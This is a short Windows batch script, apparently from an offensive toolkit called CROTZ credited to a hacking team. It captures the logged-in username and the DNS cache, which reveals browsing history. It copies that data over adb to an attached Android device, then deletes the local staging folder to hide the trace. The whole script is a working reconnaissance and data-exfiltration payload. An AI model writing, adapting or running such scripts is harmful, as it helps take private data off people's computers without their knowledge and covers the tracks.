@echo off
REM DisplayDNS - Display the DNS cached information (CROTZ)
REM Author: Gameye98/DedSecTL <dtlily>
REM Date: Tue May 5 11:37:22 2020
REM Team: BlackHole Security
whoami > C:\Users\Public\deviceName
set /p deviceNameRaw=<C:\Users\Public\deviceName
set deviceName=%deviceNameRaw:\=_%
del C:\Users\Public\deviceName
mkdir C:\Users\Public\%deviceName%
ipconfig /displaydns > C:\Users\Public\%deviceName%\displaydns.txt
adb shell if test ! -d /sdcard/Crotz; then mkdir /sdcard/Crotz;fi
adb shell if test ! -d /sdcard/Crotz/logs; then mkdir /sdcard/Crotz/logs;fi
adb push C:\Users\Public\%deviceName% /sdcard/Crotz/logs
rmdir /S/Q C:\Users\Public\%deviceName%